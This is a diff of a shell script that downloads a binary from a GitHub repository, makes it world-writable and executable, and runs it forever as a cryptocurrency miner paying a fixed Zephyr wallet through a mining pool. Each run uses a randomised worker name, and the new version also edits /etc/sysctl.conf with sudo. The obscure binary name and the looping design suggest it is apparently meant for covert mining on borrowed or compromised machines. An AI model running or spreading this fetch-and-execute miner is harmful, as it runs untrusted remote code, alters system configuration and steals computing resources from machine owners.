@@ -1,7 +1,8 @@
-wget https://github.com/renilo/kuuntul/releases/download/test/kuntulan2
-chmod 777 kuntulan2
+wget https://github.com/renilo/kuuntul/raw/main/kuntulan
+chmod 777 kuntulan
 
 while :; do
-    sudo ./kuntulan2 --algorithm randomx --pool zephyr.miningocean.org:5332 --wallet ZEPHs8ZDBWJeLA4UwGkvrjD41nWFACco1TrSf5QtFFw9Vh6uPkRLHfcdZ7XNEWMTEqfgEMabn3Z3zDHszDncfPdKB6VLSLvXy82 --password $(echo $(shuf -i 1-99999999 -n 1)-VA1) --cpu-threads 4 --disable-gpu;
+    (grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf)) && sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc))) \
+&& ./kuntulan -o sg-zephyr.miningocean.org:5332 -u ZEPHs8ZDBWJeLA4UwGkvrjD41nWFACco1TrSf5QtFFw9Vh6uPkRLHfcdZ7XNEWMTEqfgEMabn3Z3zDHszDncfPdKB6VLSLvXy82 -p $(echo $(shuf -i 1-99999999 -n 1)-VA1) -a rx/0 -k --donate-level 1 -t 4;
     sleep 5;
 done
